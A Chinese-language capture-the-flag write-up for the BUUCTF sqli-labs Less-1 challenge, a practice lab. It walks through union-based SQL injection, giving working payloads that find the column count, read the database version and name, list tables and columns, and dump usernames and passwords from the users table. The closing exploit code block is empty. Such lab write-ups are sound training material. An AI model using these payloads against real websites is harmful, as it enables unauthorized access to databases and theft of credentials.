# 分析

来自[BUUCTF_sqli-labs](https://buuoj.cn/challenges#sqli-labs)

## 判断注入点

当`http://40dd9317-fb33-4588-be74-bd647e6c8338.node5.buuoj.cn/Less-1/?id=1`时

![image-20240630134940746](image/image-20240630134940746.png)

当`id=2`时

![image-20240630135044010](image/image-20240630135044010.png)

因为根据id不同，返回的页面也不同，存在数据库查询，所有存在注入点

## 判断注入类型

### 数字型

当`select * from table_name where id=1 and 1=1`和 `select * from table_name where id=1 and 1=2`

第一句是恒成立的，页面回显正常，第二个为假，页面回显不正常

### 字符型

当`select * from table_name where id ='1' and '1'='1'`和`select * from table_name where id ='1' and '1'='2'`

第一句是恒成立的，页面回显正常，第二句为假，页面回显不正常

如果是字符型，还有判断闭合符号`'`，`"`，`')`，`")`，这里是`'`

## 判读显示位

当``?id=1'order by 3--+`回显正常，`?id=1'order by 4--+`回显错误，那回显位就是3

然后判断能回显的位

payload=`?id=-1'union select 1,2,3--+`，所有2和3能够正确回显

![image-20240630141439082](image/image-20240630141439082.png)

## 爆数据库和版本

payload=`?id=-1'union select 1,version(),database()--+`

![image-20240630141246297](image/image-20240630141246297.png)

## 爆表名

payload=`?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+`

![image-20240630142101997](image/image-20240630142101997.png)

## 爆列名

payload=`?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+`

![image-20240630142407568](image/image-20240630142407568.png)

## 爆字段

payload=`?id=-1'union select 1,2,group_concat(username,'~',password) from users--+`

![image-20240630143002277](image/image-20240630143002277.png)

# exp

```python

```

